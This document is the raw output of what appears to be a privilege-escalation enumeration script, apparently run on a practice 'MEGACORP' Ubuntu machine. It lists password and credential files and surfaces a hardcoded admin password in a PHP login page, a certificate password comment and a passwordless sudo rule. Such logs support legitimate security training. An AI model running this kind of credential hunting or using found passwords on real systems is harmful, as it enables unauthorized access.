2020-01-24 12:51:08,543 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-01-24 12:51:08,543 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-01-25 03:14:20,094 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-01-25 03:14:20,094 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-01-27 11:06:29,373 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-01-27 11:06:29,374 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-01-27 22:16:36,778 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-01-27 22:16:36,778 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-01-27 22:33:20,340 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-01-27 22:33:20,340 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-01-27 22:56:45,625 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-01-27 22:56:45,625 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-01-27 23:08:51,522 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-01-27 23:08:51,522 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-01-27 23:11:30,173 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-01-27 23:11:30,173 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-01-28 13:27:18,777 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-01-28 13:27:18,777 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-01-28 13:53:49,838 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-01-28 13:53:49,838 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-01-28 14:22:59,852 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-01-28 14:22:59,852 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-02-25 13:52:24,741 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-02-25 13:52:24,741 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-20 12:28:18,749 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-20 12:28:18,749 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-20 13:29:19,692 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-20 13:29:19,692 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-20 13:32:04,637 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-20 13:32:04,637 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-03-20 13:34:22,397 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-03-20 13:34:22,397 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2020-09-11 11:50:40,083 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-09-11 11:50:40,083 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2021-07-08 02:01:35,939 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2021-07-08 02:01:35,939 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
 base-passwd depends on libc6 (>= 2.8); however:
 base-passwd depends on libdebconfclient0 (>= 0.145); however:

╔══════════╣ Finding emails inside logs (limit 70)
      2 ftpmaster@ubuntu.com                                                                                        
      1 snaps@canonical.com
      1 dm-devel@redhat.com

╔══════════╣ Finding *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                           
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/snap/core/7270/bin/systemd-ask-password
/snap/core/7270/bin/systemd-tty-ask-password-agent
/snap/core/7270/etc/pam.d/common-password
/snap/core/7270/lib/systemd/systemd-reply-password
/snap/core/7270/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/snap/core/7270/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/snap/core/7270/lib/systemd/system/systemd-ask-password-console.path
/snap/core/7270/lib/systemd/system/systemd-ask-password-console.service
/snap/core/7270/lib/systemd/system/systemd-ask-password-wall.path
/snap/core/7270/lib/systemd/system/systemd-ask-password-wall.service
  #)There are more creds/passwds files in the previous parent folder

/snap/core/7270/usr/lib/pppd/2.4.7/passwordfd.so
/snap/core/7270/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/snap/core/7270/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-35.pyc
/snap/core/7270/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/snap/core/7270/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-35.pyc
/snap/core/7270/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-35.pyc                                                                                        
/snap/core/7270/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/snap/core/7270/usr/share/pam/common-password
/snap/core/7270/usr/share/pam/common-password.md5sums
/snap/core/7270/var/cache/debconf/passwords.dat
/snap/core/7270/var/lib/pam/password
/snap/core/8268/bin/systemd-ask-password
/snap/core/8268/bin/systemd-tty-ask-password-agent
/snap/core/8268/etc/pam.d/common-password
/snap/core/8268/lib/systemd/systemd-reply-password
/snap/core/8268/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/snap/core/8268/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/snap/core/8268/lib/systemd/system/systemd-ask-password-console.path
/snap/core/8268/lib/systemd/system/systemd-ask-password-console.service
/snap/core/8268/lib/systemd/system/systemd-ask-password-wall.path
/snap/core/8268/lib/systemd/system/systemd-ask-password-wall.service
  #)There are more creds/passwds files in the previous parent folder

/snap/core/8268/usr/lib/pppd/2.4.7/passwordfd.so
/snap/core/8268/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/snap/core/8268/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-35.pyc
/snap/core/8268/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/snap/core/8268/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-35.pyc
/snap/core/8268/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-35.pyc                                                                                        
/snap/core/8268/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/snap/core/8268/usr/share/pam/common-password
/snap/core/8268/usr/share/pam/common-password.md5sums
/snap/core/8268/var/cache/debconf/passwords.dat
/snap/core/8268/var/lib/pam/password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c

╔══════════╣ Finding passwords inside key folders (limit 70) - only PHP files
/var/www/html/cdn-cgi/login/index.php:if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")   
/var/www/html/cdn-cgi/login/index.php:<input type="password" name="password" placeholder="Password" />

╔══════════╣ Finding passwords inside key folders (limit 70) - no PHP files
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.         
/etc/bash_completion.d/grub:__grub_mkpasswd_pbkdf2_program="grub-mkpasswd-pbkdf2"
/etc/cloud/cloud.cfg:     lock_passwd: True
/etc/cloud/cloud.cfg:     sudo: ["ALL=(ALL) NOPASSWD:ALL"]
/etc/debconf.conf:#BindPasswd: secret
/etc/nsswitch.conf:passwd:         compat systemd
/etc/overlayroot.conf:#     crypt:dev=/dev/vdb,pass=somepassword,mkfs=0
/etc/overlayroot.conf:#      $ MAPNAME="secure"; DEV="/dev/vdg"; PASSWORD="foobar"
/etc/pam.d/common-password:password     [success=1 default=ignore]      pam_unix.so obscure sha512
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:challengePassword          = A challenge password
/etc/ssl/openssl.cnf:challengePassword_max              = 20
/etc/ssl/openssl.cnf:challengePassword_min              = 4
/etc/ssl/openssl.cnf:# input_password = secret
/etc/ssl/openssl.cnf:# output_password = secret
/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password \1 xxxxxx/g' > \
/var/backups/dpkg.status.0:Depends: passwd, debconf (>= 0.5) | debconf-2.0

╔══════════╣ Finding possible password variables inside key folders (limit 140)
                                                                                                                    
╔══════════╣ Finding possible password in config files
 /etc/overlayroot.conf                                                                                              
password is randomly generated
password will be stored for recovery in
passwd
password,mkfs=0
PASSWORD="foobar"
PASSWORD" |
PASSWORD" |
PASSWORD HERE IN THIS CLEARTEXT CONFIGURATION
passwords are more secure, but you won't be able to
passwords are generated by calculating the sha512sum
 /etc/adduser.conf
passwd
 /etc/apache2/apache2.conf
passwd files from being
 /etc/nsswitch.conf
passwd:         compat systemd
 /etc/debconf.conf
passwords.
password
passwords.
passwords
password
passwords.dat
passwords and one for everything else.
passwords
password is really
Passwd: secret
 /etc/sysctl.d/10-ptrace.conf
credentials that exist in memory (re-using existing SSH connections,

╔══════════╣ Finding 'username' string inside key folders (limit 70)
/var/www/html/cdn-cgi/login/index.php:if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")   
/var/www/html/cdn-cgi/login/index.php:<input type="text" placeholder="Username" name="username" autofocus />

╔══════════╣ Searching specific hashes inside files - less false positives (limit 70)
 